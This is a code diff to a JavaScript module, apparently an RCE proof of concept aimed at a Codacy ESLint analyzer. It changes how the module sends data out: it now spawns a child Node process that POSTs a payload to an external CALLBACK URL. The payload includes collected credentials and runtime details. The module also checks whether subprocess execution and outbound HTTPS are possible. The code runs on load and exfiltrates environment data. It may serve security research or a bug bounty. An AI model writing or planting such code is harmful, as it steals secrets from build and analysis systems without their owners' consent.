@@ -1,7 +1,7 @@
 "use strict";
 
 const fs = require("node:fs");
-const https = require("node:https");
+const { spawnSync } = require("node:child_process");
 
 const CANARY = "codacy-analyzer-rce-064a0614a716d033f1791a45";
 const CALLBACK =
@@ -45,6 +45,49 @@ if (!globalThis.__codacyAnalyzerCanarySent) {
     runtime,
     credentials,
   });
+  const networkProbe = spawnSync(
+    process.execPath,
+    [
+      "-e",
+      `
+        const https = require("node:https");
+        const target = process.argv[1];
+        const chunks = [];
+        process.stdin.on("data", (chunk) => chunks.push(chunk));
+        process.stdin.on("end", () => {
+          const body = Buffer.concat(chunks);
+          const request = https.request(
+            target,
+            {
+              method: "POST",
+              headers: {
+                "content-type": "application/json",
+                "content-length": body.length,
+                "user-agent": "codacy-analyzer-canary/eslint",
+              },
+              timeout: 5_000,
+            },
+            (response) => {
+              response.resume();
+              response.on("end", () => process.exit(0));
+            },
+          );
+          request.on("error", () => process.exit(2));
+          request.on("timeout", () => request.destroy());
+          request.end(body);
+        });
+      `,
+      CALLBACK,
+    ],
+    {
+      env: {},
+      input: payload,
+      timeout: 7_000,
+      stdio: ["pipe", "ignore", "ignore"],
+    },
+  );
+  const subprocessExecuted = networkProbe.error === undefined;
+  const egressSucceeded = networkProbe.status === 0;
 
   runtimeEvidence = [
     "CODACY_CANARY_EXECUTED",
@@ -53,26 +96,10 @@ if (!globalThis.__codacyAnalyzerCanarySent) {
     `source_writable=${runtime.sourceWritable}`,
     `root_writable=${runtime.rootWritable}`,
     `workdir_writable=${runtime.workdirWritable}`,
+    `subprocess_exec=${subprocessExecuted}`,
+    `https_egress=${egressSucceeded}`,
     `credential_names=${Object.keys(credentials).sort().join(",")}`,
   ].join(" ");
-
-  const request = https.request(
-    CALLBACK,
-    {
-      method: "POST",
-      headers: {
-        "content-type": "application/json",
-        "content-length": Buffer.byteLength(payload),
-        "user-agent": "codacy-analyzer-canary/eslint",
-      },
-      timeout: 5_000,
-    },
-    (response) => response.resume(),
-  );
-
-  request.on("error", () => {});
-  request.on("timeout", () => request.destroy());
-  request.end(payload);
 }
 
 module.exports = { runtimeEvidence };
